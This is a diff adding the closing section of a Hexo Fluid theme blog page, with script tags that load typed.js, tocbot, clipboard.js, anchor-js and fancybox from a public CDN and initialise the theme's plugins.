+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
